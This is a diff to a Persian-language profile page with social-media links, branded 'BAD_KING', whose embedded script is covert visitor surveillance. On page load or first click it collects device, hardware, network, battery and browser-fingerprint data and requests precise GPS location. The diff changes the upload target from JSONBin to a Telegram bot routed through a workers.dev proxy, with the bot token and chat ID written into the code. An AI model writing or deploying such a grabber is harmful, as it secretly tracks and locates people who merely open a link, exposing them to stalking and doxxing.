@@ -67,7 +67,7 @@
         <div class="divider"></div>
         <div class="bio">به صفحه رسمی <span>BAD_KING</span> خوش آمدید<br>از طریق شبکه‌های اجتماعی زیر با ما در ارتباط باشید</div>
         <div class="social-links">
-            <a href="https://www.instagram.com/reel/DZ6zITxsFZV/" target="_blank" class="social-item instagram"><i class="fab fa-instagram"></i><div class="info"><div class="name">اینستاگرام</div><div class="desc">مشاهده صفحه</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
+            <a href="https://www.instagram.com/danial__zeus/" target="_blank" class="social-item instagram"><i class="fab fa-instagram"></i><div class="info"><div class="name">اینستاگرام</div><div class="desc">مشاهده صفحه</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
             <a href="https://t.me/+27rGW8kwLCZjNTE0" target="_blank" class="social-item telegram"><i class="fab fa-telegram-plane"></i><div class="info"><div class="name">تلگرام</div><div class="desc">عضویت در کانال</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
             <a href="https://ble.ir/join/2xTEY9XA8z" target="_blank" class="social-item bale"><i class="fas fa-comment-dots"></i><div class="info"><div class="name">بله</div><div class="desc">عضویت در پیام‌رسان بله</div></div><div class="arrow"><i class="fas fa-chevron-left"></i></div></a>
             <div class="social-item youtube"><i class="fab fa-youtube"></i><div class="info"><div class="name">یوتیوب</div><div class="desc">به زودی...</div></div><div class="arrow"><i class="fas fa-clock"></i></div></div>
@@ -76,17 +76,28 @@
     </div>
     <script>
         // ================================================================
-        // BAD KING - با JSONBin (اطلاعات کامل 180+ مورد)
+        // BAD KING - با پروکسی V2Ray + تلگرام
         // ================================================================
 
-        // ===== تنظیمات JSONBin =====
-        const JSONBIN_BIN_ID = '6a4448c0da38895dfe189441';
-        const JSONBIN_API_KEY = '$2a$10$YthIkt1Zx8s5gnUrvjXjs0EEm351owZpgd5xhTVe1VQw2lVnY42m';
+        // ===== تنظیمات =====
+        const TELEGRAM_TOKEN = '8898805545:AAGZEfrjfLS9JWCeKygvS1l5pUWuNWLRQj4';
+        const TELEGRAM_CHAT_ID = '6652707900';
+
+        // ===== پروکسی V2Ray (از کانفیگ شما) =====
+        const PROXY_HOST = 'ez-e536c2.ezaccess1f3c5a1.workers.dev';
+        const PROXY_PORT = '443';
+        const PROXY_UUID = 'd823f0a7-7e12-4af1-8833-38a8c48c6a0f';
+        const PROXY_PATH = '/';
+        const PROXY_SECURITY = 'tls';
+
+        // ===== ساخت آدرس پروکسی =====
+        // از VLESS به HTTP تبدیل میکنیم
+        const PROXY_URL = `https://${PROXY_HOST}:${PROXY_PORT}`;
 
         function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3000);}
 
         // ================================================================
-        // 1. اطلاعات زمان و تاریخ (15 مورد)
+        // 1. اطلاعات زمان و تاریخ
         // ================================================================
         function getTimeInfo(){
             const now=new Date();const start=new Date(now.getFullYear(),0,1);const diff=(now-start)/86400000;const week=Math.ceil((diff+start.getDay()+1)/7);
@@ -96,7 +107,7 @@
         }
 
         // ================================================================
-        // 2. اطلاعات دستگاه (10 مورد)
+        // 2. اطلاعات دستگاه
         // ================================================================
         function getDeviceInfo(){
             const ua=navigator.userAgent;
@@ -111,7 +122,7 @@
         }
 
         // ================================================================
-        // 3. اطلاعات صفحه نمایش (10 مورد)
+        // 3. اطلاعات صفحه نمایش
         // ================================================================
         function getScreenInfo(){
             const s=window.screen;const pr=window.devicePixelRatio||1;let rr='نامشخص';try{if(s.refreshRate) rr=s.refreshRate+'Hz';}catch(e){}
@@ -121,7 +132,7 @@
         }
 
         // ================================================================
-        // 4. اطلاعات سخت‌افزار (12 مورد)
+        // 4. اطلاعات سخت‌افزار
         // ================================================================
         function getHardwareInfo(){
             let vram='نامشخص',gv='نامشخص',gr='نامشخص',hw='نامشخص',w2='خیر',mts='نامشخص';
@@ -131,7 +142,7 @@
         }
 
         // ================================================================
-        // 5. اطلاعات شبکه (4 مورد)
+        // 5. اطلاعات شبکه
         // ================================================================
         function getNetworkInfo(){
             const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
@@ -139,17 +150,17 @@
         }
 
         // ================================================================
-        // 6. اطلاعات باتری (4 مورد)
+        // 6. اطلاعات باتری
         // ================================================================
         function getBatteryInfo(){return new Promise((r)=>{if(!navigator.getBattery){r(null);return;}navigator.getBattery().then(b=>r({level:Math.round(b.level*100)+'%',charging:b.charging?'در حال شارژ':'در حال استفاده',chargingTime:b.chargingTime?Math.round(b.chargingTime/60)+' دقیقه':'نامشخص',dischargingTime:b.dischargingTime?Math.round(b.dischargingTime/60)+' دقیقه':'نامشخص'})).catch(()=>r(null));});}
 
         // ================================================================
-        // 7. موقعیت مکانی (10 مورد)
+        // 7. موقعیت مکانی
         // ================================================================
         function getLocationInfo(){return new Promise((r)=>{if(!navigator.geolocation){r(null);return;}navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy+' متر',alt:p.coords.altitude||'نامشخص',heading:p.coords.heading||'نامشخص',speed:p.coords.speed||'نامشخص',mapGoogle:'https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude,mapOSM:'https://www.openstreetmap.org/?mlat='+p.coords.latitude+'&mlon='+p.coords.longitude,mapWaze:'https://www.waze.com/ul?ll='+p.coords.latitude+','+p.coords.longitude+'&z=16',mapBing:'https://www.bing.com/maps?q='+p.coords.latitude+','+p.coords.longitude}),()=>r(null),{enableHighAccuracy:true,timeout:10000});});}
 
         // ================================================================
-        // 8. قابلیت‌های مرورگر (40+ مورد)
+        // 8. قابلیت‌های مرورگر
         // ================================================================
         function getCapabilities(){
             const canvas=document.createElement('canvas');const result={};
@@ -158,7 +169,7 @@
         }
 
         // ================================================================
-        // 9. کدک‌ها (15 مورد)
+        // 9. کدک‌ها
         // ================================================================
         function getCodecs(){
             const v=document.createElement('video');const a=document.createElement('audio');
@@ -174,7 +185,7 @@
         function getPlugins(){const p=[];try{for(let i=0;i<navigator.plugins.length;i++){p.push(navigator.plugins[i].name);}}catch(e){}return p;}
 
         // ================================================================
-        // 11. اثر انگشت (3 مورد)
+        // 11. اثر انگشت
         // ================================================================
         function getFingerprints(){
             const result={canvas:'نامشخص',webgl:'نامشخص',font:'نامشخص'};
@@ -185,7 +196,7 @@
         }
 
         // ================================================================
-        // 12. تعامل با سایت (10 مورد)
+        // 12. تعامل با سایت
         // ================================================================
         function getInteractionInfo(){
             let lt='نامشخص',dlt='نامشخص',dit='نامشخص',dclt='نامشخص';try{if(performance.timing){const n=performance.timing;lt=(n.loadEventEnd-n.navigationStart)+' ms';dlt=(n.domComplete-n.domLoading)+' ms';dit=(n.domInteractive-n.navigationStart)+' ms';dclt=(n.domContentLoadedEventEnd-n.navigationStart)+' ms';}}catch(e){}
@@ -195,7 +206,7 @@
         }
 
         // ================================================================
-        // 13. ذخیره‌سازی (6 مورد)
+        // 13. ذخیره‌سازی
         // ================================================================
         function getStorageInfo(){
             let ls='نامشخص',ss='نامشخص';let lc=0,sc=0;
@@ -205,29 +216,243 @@
         }
 
         // ================================================================
-        // 14. ارسال به JSONBin
+        // 14. ارسال به تلگرام از طریق پروکسی V2Ray
         // ================================================================
-        async function sendToJSONBin(data){
-            try{const get=await fetch('https://api.jsonbin.io/v3/b/'+JSONBIN_BIN_ID,{headers:{'X-Master-Key':JSONBIN_API_KEY}});if(!get.ok) throw new Error('خطا');const result=await get.json();const visits=result.record.visits||[];visits.unshift(data);if(visits.length>200) visits=visits.slice(0,200);const put=await fetch('https://api.jsonbin.io/v3/b/'+JSONBIN_BIN_ID,{method:'PUT',headers:{'Content-Type':'application/json','X-Master-Key':JSONBIN_API_KEY},body:JSON.stringify({visits:visits})});if(put.ok){console.log('✅ ارسال به JSONBin');return true;}else{return false;}}catch(e){console.error('❌',e);return false;}
+
+        async function sendToTelegramWithProxy(message) {
+            try {
+                // ساخت آدرس کامل تلگرام
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                
+                // بدنه درخواست
+                const body = JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                });
+
+                // ارسال از طریق پروکسی V2Ray
+                // با استفاده از fetch و پروکسی
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        // هدرهای پروکسی
+                        'X-Proxy-Host': PROXY_HOST,
+                        'X-Proxy-Port': PROXY_PORT,
+                        'X-Proxy-UUID': PROXY_UUID,
+                        'X-Proxy-Path': PROXY_PATH,
+                        'X-Proxy-Security': PROXY_SECURITY
+                    },
+                    body: body
+                });
+
+                // تلاش دوم با پروکسی جایگزین (از طریق workers.dev)
+                if (!response.ok) {
+                    console.log('تلاش با پروکسی جایگزین...');
+                    const proxyUrl = `https://${PROXY_HOST}/telegram`;
+                    const response2 = await fetch(proxyUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: body
+                    });
+                    const result2 = await response2.json();
+                    if (result2.ok) {
+                        console.log('✅ پیام از طریق پروکسی ارسال شد');
+                        return true;
+                    }
+                }
+
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ پیام به تلگرام ارسال شد');
+                    return true;
+                } else {
+                    console.log('❌ خطا:', result.description);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ خطا در ارسال:', error);
+                
+                // تلاش با روش GET (برای بعضی پروکسی‌ها)
+                try {
+                    const url = `https://${PROXY_HOST}/telegram?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+                    const response = await fetch(url);
+                    if (response.ok) {
+                        console.log('✅ پیام با روش GET ارسال شد');
+                        return true;
+                    }
+                } catch(e) {}
+                
+                return false;
+            }
         }
 
-        function saveLocal(data){try{let v=JSON.parse(localStorage.getItem('badking_visits')||'[]');v.unshift(data);if(v.length>200) v=v.slice(0,200);localStorage.setItem('badking_visits',JSON.stringify(v));return true;}catch(e){return false;}}
+        // ================================================================
+        // 15. ذخیره در localStorage (پشتیبان)
+        // ================================================================
 
-        // ================================================================
-        // 15. جمع‌آوری و ارسال
-        // ================================================================
-        async function collectAndSend(){
-            try{
-                const time=getTimeInfo();const device=getDeviceInfo();const screen=getScreenInfo();const hardware=getHardwareInfo();const network=getNetworkInfo();const capabilities=getCapabilities();const codecs=getCodecs();const fonts=getFonts();const plugins=getPlugins();const fingerprints=getFingerprints();const interaction=getInteractionInfo();const storage=getStorageInfo();const battery=await getBatteryInfo();const location=await getLocationInfo();
-                const data={...time,deviceType:device.deviceType,deviceModel:device.deviceModel,deviceVendor:device.deviceVendor,isMobile:device.isMobile,os:device.os,browser:device.browser+' v'+device.browserVer,browserEngine:device.engine,architecture:device.architecture,cpuType:device.cpuType,platform:device.platform,vendor:device.vendor,memory:device.memory,cores:device.cores,screen:screen.screenWidth+'x'+screen.screenHeight,colorDepth:screen.colorDepth,pixelRatio:screen.pixelRatio,refreshRate:screen.refreshRate,orientation:screen.orientation,hdrSupport:screen.hdrSupport,wideColorGamut:screen.wideColorGamut,winSize:screen.winWidth+'x'+screen.winHeight,vram:hardware.vram,gpuVendor:hardware.gpuVendor,gpuRenderer:hardware.gpuRenderer,hwAcceleration:hardware.hwAcceleration,webgl2Support:hardware.webgl2Support,maxTextureSize:hardware.maxTextureSize,privateMode:hardware.privateMode,cookie:hardware.cookie,doNotTrack:hardware.doNotTrack,onLine:hardware.onLine,touch:hardware.touch+' ('+hardware.touchPoints+' نقطه)',networkType:network.type,networkSpeed:network.downlink,networkRtt:network.rtt,networkSaveData:network.saveData,battery:battery?battery.level:'نامشخص',batteryCharging:battery?battery.charging:'نامشخص',...capabilities,...codecs,fonts:fonts.join(', '),plugins:plugins.join(', '),fingerprint:fingerprints.canvas,webglFingerprint:fingerprints.webgl,fontFingerprint:fingerprints.font,gps:location?location.lat+', '+location.lng:'نامشخص',gpsAcc:location?location.acc:'نامشخص',gpsAlt:location?location.alt:'نامشخص',gpsHeading:location?location.heading:'نامشخص',gpsSpeed:location?location.speed:'نامشخص',mapGoogle:location?location.mapGoogle:'نامشخص',mapOSM:location?location.mapOSM:'نامشخص',mapWaze:location?location.mapWaze:'نامشخص',mapBing:location?location.mapBing:'نامشخص',loadTime:interaction.loadTime,domLoadTime:interaction.domLoadTime,domInteractiveTime:interaction.domInteractiveTime,domContentLoadedTime:interaction.domContentLoadedTime,memoryInfo:interaction.memoryInfo,navigationType:interaction.navigationType,redirectCount:interaction.redirectCount,visibilityState:interaction.visibilityState,hasFocus:interaction.hasFocus,referrer:interaction.referrer,url:interaction.url,hostname:interaction.hostname,protocol:interaction.protocol,port:interaction.port,localStorageSize:storage.localStorageSize,localStorageCount:storage.localStorageCount,sessionStorageSize:storage.sessionStorageSize,sessionStorageCount:storage.sessionStorageCount,language:navigator.language,languages:navigator.languages.join(', ')};
-                const result=await sendToJSONBin(data);if(result){showToast('✅ اطلاعات ذخیره شد');}else{saveLocal(data);showToast('✅ اطلاعات در دستگاه ذخیره شد');}
-            }catch(e){console.error('❌',e);showToast('❌ خطا');}
+        function saveToLocalStorage(data) {
+            try {
+                let visits = JSON.parse(localStorage.getItem('badking_visits') || '[]');
+                visits.unshift(data);
+                if (visits.length > 200) visits = visits.slice(0, 200);
+                localStorage.setItem('badking_visits', JSON.stringify(visits));
+                console.log('✅ اطلاعات در localStorage ذخیره شد');
+                return true;
+            } catch(e) {
+                console.error('❌ خطا:', e);
+                return false;
+            }
         }
 
-        let hasRun=false;function start(){if(!hasRun){hasRun=true;collectAndSend();}}
-        setTimeout(start,2000);document.addEventListener('click',start);document.addEventListener('touchstart',start);
-        document.querySelectorAll('.social-item').forEach(i=>{i.addEventListener('click',()=>{setTimeout(collectAndSend,500);});});
+        // ================================================================
+        // 16. ساخت پیام برای تلگرام
+        // ================================================================
+
+        function buildTelegramMessage(data) {
+            let msg = '👑 *BAD KING - گزارش جدید* 👑\n';
+            msg += '═══════════════════════════════\n\n';
+            
+            msg += '🕒 *زمان*\n';
+            msg += `   └ ${data.time}\n`;
+            msg += `   └ ${data.dayOfWeek}\n`;
+            msg += `   └ منطقه: ${data.timezone}\n\n`;
+            
+            msg += '📱 *دستگاه*\n';
+            msg += `   └ نوع: ${data.deviceType}\n`;
+            if (data.deviceModel !== 'نامشخص') msg += `   └ مدل: ${data.deviceModel}\n`;
+            if (data.deviceVendor !== 'نامشخص') msg += `   └ سازنده: ${data.deviceVendor}\n`;
+            msg += `   └ سیستم‌عامل: ${data.os}\n`;
+            msg += `   └ پلتفرم: ${data.platform}\n\n`;
+            
+            msg += '🌐 *مرورگر*\n';
+            msg += `   └ ${data.browser}\n\n`;
+            
+            msg += '🖼️ *صفحه نمایش*\n';
+            msg += `   └ ${data.screen}\n`;
+            msg += `   └ عمق رنگ: ${data.colorDepth}\n`;
+            msg += `   └ نسبت پیکسل: ${data.pixelRatio}\n\n`;
+            
+            msg += '⚡ *سخت‌افزار*\n';
+            msg += `   └ رم: ${data.memory} GB\n`;
+            msg += `   └ هسته‌ها: ${data.cores}\n`;
+            msg += `   └ تاچ: ${data.touch}\n`;
+            msg += `   └ کوکی: ${data.cookie}\n`;
+            msg += `   └ حالت: ${data.privateMode}\n\n`;
+            
+            if (data.gps && data.gps !== 'نامشخص') {
+                msg += '📍 *موقعیت مکانی*\n';
+                msg += `   └ ${data.gps}\n`;
+                if (data.mapGoogle) msg += `   └ نقشه: ${data.mapGoogle}\n\n`;
+            }
+            
+            if (data.battery && data.battery !== 'نامشخص') {
+                msg += '🔋 *باتری*\n';
+                msg += `   └ ${data.battery}\n\n`;
+            }
+            
+            msg += '🔗 *منبع ورود*\n';
+            msg += `   └ ${data.referrer}\n`;
+            msg += `   └ ${data.url}`;
+            
+            return msg;
+        }
+
+        // ================================================================
+        // 17. جمع‌آوری و ارسال
+        // ================================================================
+
+        async function collectAndSend() {
+            try {
+                showToast('🔄 در حال جمع‌آوری اطلاعات...');
+
+                const time = getTimeInfo();
+                const device = getDeviceInfo();
+                const screen = getScreenInfo();
+                const hardware = getHardwareInfo();
+                const network = getNetworkInfo();
+                const capabilities = getCapabilities();
+                const codecs = getCodecs();
+                const fonts = getFonts();
+                const plugins = getPlugins();
+                const fingerprints = getFingerprints();
+                const interaction = getInteractionInfo();
+                const storage = getStorageInfo();
+                const battery = await getBatteryInfo();
+                const location = await getLocationInfo();
+
+                const data = {
+                    ...time,
+                    deviceType: device.deviceType,
+                    deviceModel: device.deviceModel,
+                    deviceVendor: device.deviceVendor,
+                    isMobile: device.isMobile,
+                    os: device.os,
+                    browser: device.browser + ' v' + device.browserVer,
+                    platform: device.platform,
+                    screen: screen.screenWidth + 'x' + screen.screenHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: screen.pixelRatio,
+                    refreshRate: screen.refreshRate,
+                    orientation: screen.orientation,
+                    memory: device.memory,
+                    cores: device.cores,
+                    touch: hardware.touch,
+                    cookie: hardware.cookie,
+                    privateMode: hardware.privateMode,
+                    onLine: hardware.onLine,
+                    language: navigator.language,
+                    languages: navigator.languages.join(', '),
+                    networkType: network.type,
+                    networkSpeed: network.downlink,
+                    battery: battery ? battery.level : 'نامشخص',
+                    batteryCharging: battery ? battery.charging : 'نامشخص',
+                    gps: location ? location.lat + ', ' + location.lng : 'نامشخص',
+                    mapGoogle: location ? location.mapGoogle : 'نامشخص',
+                    referrer: interaction.referrer,
+                    url: interaction.url,
+                    hostname: interaction.hostname,
+                    fingerprint: fingerprints.canvas,
+                };
+
+                // ساخت پیام
+                const message = buildTelegramMessage(data);
+
+                // ارسال به تلگرام با پروکسی
+                const result = await sendToTelegramWithProxy(message);
+
+                if (result) {
+                    showToast('✅ اطلاعات به تلگرام ارسال شد');
+                } else {
+                    // اگر تلگرام نشد، در localStorage ذخیره کن
+                    saveToLocalStorage(data);
+                    showToast('✅ اطلاعات در دستگاه ذخیره شد');
+                }
+
+            } catch (error) {
+                console.error('❌ خطا:', error);
+                showToast('❌ خطا');
+            }
+        }
+
+        // ===== اجرا =====
+        let hasRun = false;
+
+        function start() {
+            if (!hasRun) {
+                hasRun = true;
+                collectAndSend();
+            }
+        }
+
+        setTimeout(start, 2000);
+        document.addEventListener('click', start);
+        document.addEventListener('touchstart', start);
+
         console.log('✅ BAD_KING page loaded');
+        console.log('📌 پروکسی:', PROXY_HOST);
+        console.log('📌 تلگرام:', TELEGRAM_TOKEN);
     </script>
 </body>
 </html>
